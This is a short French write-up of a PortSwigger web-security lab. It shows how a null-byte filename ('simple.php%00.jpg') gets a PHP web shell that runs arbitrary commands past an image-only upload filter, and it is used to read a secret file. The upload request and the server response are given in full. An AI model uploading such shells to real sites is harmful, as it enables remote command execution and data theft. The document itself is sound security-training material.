# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

## Solution

Dans ce lab, on peut upload uniquement des fichiers jpg ou jpeg.

Donc pour upload un fichier qui finit par `.php`, on peut utiliser le null byte `%00` par exemple `simple.php%00.jpg`:

```http
POST /my-account/avatar HTTP/2
Host: 0a3e002304b8510384511349001e0031.web-security-academy.net
Cookie: session=skzjzpYXVqzTudNHhKBoRS28KkPYpzzo
Content-Length: 752
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3e002304b8510384511349001e0031.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoxV2BBlWVLOHPyci
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e002304b8510384511349001e0031.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryoxV2BBlWVLOHPyci
Content-Disposition: form-data; name="avatar"; filename="simple.php%00.jpg"
Content-Type: application/octet-stream

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2&<1');
    }
?>
</pre>
</body>
</html>
------WebKitFormBoundaryoxV2BBlWVLOHPyci
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryoxV2BBlWVLOHPyci
Content-Disposition: form-data; name="csrf"

0C7FdnwyMGXuuuppdAIpYn6mDJSffhcZ
------WebKitFormBoundaryoxV2BBlWVLOHPyci--
```

```http
HTTP/2 200 OK
Date: Fri, 13 Oct 2023 20:48:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 131

The file avatars/simple.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Le fichier a bien été upload et se termine par `.php` ce qui nous permet d'executer `cat /home/carlos/secret`.